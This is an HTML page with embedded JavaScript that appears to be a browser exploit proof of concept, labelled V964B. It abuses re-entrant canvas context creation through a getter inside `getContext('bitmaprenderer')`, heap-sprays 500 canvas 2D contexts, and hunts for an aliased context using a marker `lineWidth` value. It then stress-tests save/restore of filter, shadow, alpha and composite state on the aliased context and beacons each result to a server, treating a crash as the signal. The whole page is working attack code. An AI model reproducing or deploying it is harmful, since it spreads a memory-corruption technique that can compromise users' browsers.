<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>V964B</title></head>
<body><pre id="out">V964B — alias filter/shadow/alpha/composite × save/restore oracle (B)</pre>
<script>
'use strict';
var O=document.getElementById('out');
var RUN='r'+Date.now().toString(36)+Math.random().toString(36).slice(2,6);
var al=null;
function say(s){O.textContent+='\n'+s;}
function bk(tag,body){try{new Image().src='/beacon/V964B-'+tag+'?d='+encodeURIComponent(String(body==null?'':body).slice(0,700))+'&run='+encodeURIComponent(RUN)+'&t='+Date.now()+'&s=1';}catch(e){}}
window.onerror=function(msg,src,line){ bk('ERR','onerror:'+String(msg)+'@'+line); };
function st(){
  try{
    return 'a='+al.globalAlpha+'|gco='+al.globalCompositeOperation+'|sb='+al.shadowBlur+'|sx='+al.shadowOffsetX+'|sy='+al.shadowOffsetY+'|sc='+al.shadowColor+('filter' in al?'|f='+al.filter:'|f=na');
  }catch(e){ return 'stEx:'+String(e&&e.name); }
}
function snap(stage,exp){
  var got=st();
  var m=(exp==null)?'-':(got===exp?1:0);
  bk(stage,'got='+got+(exp!=null?'|m='+m:''));
  return m;
}
async function establishAlias(){
  bk('BOOT','alias filter/shadow/alpha/composite × save/restore; run='+RUN);
  var inner=null;
  var c=document.createElement('canvas'); c.width=64; c.height=64;
  var settings={};
  Object.defineProperty(settings,'alpha',{get:function(){ try{ inner=c.getContext('2d'); }catch(e){} return true; }});
  try{ c.getContext('bitmaprenderer', settings); }catch(e){ bk('BMR-ERR',String(e&&e.name)); }
  if(!inner){ bk('NO-INNER',''); return false; }
  bk('INNER','ok');
  var spray=[];
  for(var i=0;i<500;i++){ var c2=document.createElement('canvas'); c2.width=64; c2.height=64; var g=c2.getContext('2d'); g.lineWidth=1000+i; spray.push({c:c2,g:g}); }
  bk('SPRAY','500');
  var found=-1;
  try{ inner.lineWidth=13131.13; }catch(e){ bk('W1-ERR',String(e)); return false; }
  for(var i=0;i<spray.length;i++){ try{ if(Math.abs(spray[i].g.lineWidth-13131.13)<0.01){ found=i; al=spray[i].g; break; } }catch(e){} }
  bk('ALIAS', found>=0?('idx='+found):'MISS');
  bk('HAS-FILTER', ('filter' in al)?'1':'0');
  return found>=0;
}
(async function(){
  if(!(await establishAlias())){ bk('DONE','no-alias/stop'); say('no alias'); return; }
  // baseline
  bk('S0-PRE','baseline');
  try{
    al.globalAlpha=1; al.globalCompositeOperation='source-over';
    al.shadowBlur=0; al.shadowOffsetX=0; al.shadowOffsetY=0; al.shadowColor='rgba(0, 0, 0, 0)';
    if('filter' in al) al.filter='none';
  }catch(e){ bk('S0-EX',String(e)); }
  var base=st(); snap('S0-OK',base);
  // A
  bk('A-PRE','mutate+restore');
  try{
    al.save();
    al.globalAlpha=0.25; al.globalCompositeOperation='multiply';
    al.shadowBlur=12; al.shadowOffsetX=7; al.shadowOffsetY=-3; al.shadowColor='rgba(255, 0, 0, 0.5)';
    if('filter' in al) al.filter='blur(2px)';
    snap('A-mut',null);
    al.restore(); snap('A-rest',base);
  }catch(e){ bk('A-EX',String(e)); }
  // B nested
  bk('B-PRE','nested3');
  try{
    al.save(); al.globalAlpha=0.5; al.globalCompositeOperation='screen';
    al.save(); al.shadowBlur=20; al.shadowColor='rgba(0, 255, 0, 1)';
    al.save(); al.globalCompositeOperation='lighter'; if('filter' in al) al.filter='grayscale(1)';
    snap('B-d3',null);
    al.restore(); snap('B-r3',null);
    al.restore(); snap('B-r2',null);
    al.restore(); snap('B-r1',base);
  }catch(e){ bk('B-EX',String(e)); }
  // C cycles
  bk('C-PRE','50 cycles');
  var ok=0;
  var gcos=['source-over','multiply','screen','overlay','darken','lighten'];
  try{
    for(var i=0;i<50;i++){
      al.save();
      al.globalAlpha=(i%10)/10; al.globalCompositeOperation=gcos[i%gcos.length];
      al.shadowBlur=i%30; al.shadowOffsetX=i-25; al.shadowOffsetY=25-i;
      if('filter' in al) al.filter=(i%2)?'blur(1px)':'none';
      al.restore();
      if(st()===base) ok++;
    }
  }catch(e){ bk('C-EX',String(e)); }
  bk('C-OK','ok='+ok+'/50');
  snap('C-snap',base);
  bk('DONE','filter/shadow/alpha/composite savestack complete; m=0/EX/crash=signal');
  say('done run='+RUN);
})();
</script>
</body></html>
